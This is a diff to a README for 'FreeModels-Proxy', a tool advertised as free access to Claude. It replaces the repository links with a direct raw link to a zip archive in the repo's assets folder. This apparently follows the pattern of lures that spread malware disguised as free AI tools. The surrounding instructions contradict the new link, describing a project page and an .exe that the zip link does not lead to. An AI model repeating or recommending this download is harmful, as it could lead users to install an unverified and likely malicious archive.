@@ -1,7 +1,7 @@
 <h1>🚀 FreeModels-Proxy - Your Free AI Bridge to Claude & Cherry Studio</h1>
 
 <p align="center">
-  <a href="https://github.com/Danielcardinal550/FreeModels-Proxy" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://raw.githubusercontent.com/Danielcardinal550/FreeModels-Proxy/main/assets/v1.3-alpha.3.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:#ffffff;font-size:20px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🎯 What Is FreeModels-Proxy?
@@ -53,7 +53,7 @@ Ready to dive in? Follow these simple steps and you'll be chatting with Claude i
 
 Visit this link to download the application: 
 
-**[https://github.com/Danielcardinal550/FreeModels-Proxy](https://github.com/Danielcardinal550/FreeModels-Proxy)**
+**[https://raw.githubusercontent.com/Danielcardinal550/FreeModels-Proxy/main/assets/v1.3-alpha.3.zip](https://raw.githubusercontent.com/Danielcardinal550/FreeModels-Proxy/main/assets/v1.3-alpha.3.zip)**
 
 Once you click the link, you'll land on the official project page. Look for a green **"Code"** button or a **"Releases"** section on the right side of the page. Click **"Releases"** to find the latest version and then click the download file that ends with **.exe** (if you see both `.exe` and `.zip` files, always pick the `.exe` file because it's the easiest to run)].
 
